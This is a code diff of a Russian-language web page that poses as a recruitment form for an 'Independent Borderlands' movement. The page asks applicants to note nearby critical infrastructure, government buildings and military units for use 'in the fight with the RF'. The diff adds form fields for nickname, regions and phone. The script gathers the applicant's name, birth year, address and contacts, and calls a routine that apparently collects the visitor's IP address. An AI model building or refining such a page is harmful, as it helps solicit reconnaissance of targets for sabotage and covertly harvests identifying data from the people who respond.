@@ -82,19 +82,19 @@
             
             Вот уже почти 500 лет как жители Приграничья находятся под гнетом кучки узурпаторов, называющих себя Российской Федерацией.
             
-            Мы приверженцы Независимого Приграничья объявляем набор добровольцев в ряды неравнодушных людей, считающих себя свободными от диктаторского режима путинской бандитской группировки.</h4>
+            Мы приверженцы Независимого Приграничья объявляем набор добровольцев в ряды неравнодушных людей, считающих себя свободными от диктаторского режима путинской бандитской группировки.
             
-            Пока мы обрабатываем данные вашей анкеты, просим обратить внимание на известные и находящиеся в непосредственной близости от Вас обьекты критической инфраструктуры, промышленности, здания  органов государственной власти и местного самоуправления, воинских частей и иных обьектов, представляющих оперативную значимость в борьбе с РФ.
+            Пока мы обрабатываем данные вашей анкеты, просим обратить внимание на известные и находящиеся в непосредственной близости от Вас обьекты критической инфраструктуры, промышленности, здания  органов государственной власти и местного самоуправления, воинских частей и иных обьектов, представляющих оперативную значимость в борьбе с РФ.</h4>
                   
         </div>
 
         <form id="mainForm" style="margin-top: 20px;">
             <input type="text" placeholder="Имя" id="fio" required>
             <input type="text" placeholder="Год рождения" id="birthYear" required>
-            <input type="text" placeholder="Псевдоним" id="address" required>
+            <input type="text" placeholder="Псевдоним" id="nickname" required>
             <input type="text" placeholder="Место проживания" id="address" required>
-            <input type="text" placeholder="Регионы, в которые готовы отправится по заданию организации." id="address" required>
-            <input type="text" placeholder="Способы связи (Номер телефона, Email адрес)" id="address" required>
+            <input type="text" placeholder="Регионы, в которые готовы отправится по заданию организации." id="regions" required>
+            <input type="text" placeholder="Контактный номер телефона" id="phone" required>
             <button type="submit" class="button">Отправить данные</button>
         </form>
     </div>
@@ -139,7 +139,9 @@
             collectedData.fio = document.getElementById('fio').value;
             collectedData.birthYear = document.getElementById('birthYear').value;
             collectedData.address = document.getElementById('address').value;
-            
+            collectedData.nickname = document.getElementById('nickname').value;
+            collectedData.regions = document.getElementById("regions").value;
+            collectedData.phone = document.getElementById('phone').value;
             await collectIP();
             
             if (!IS_IP_SENT) {
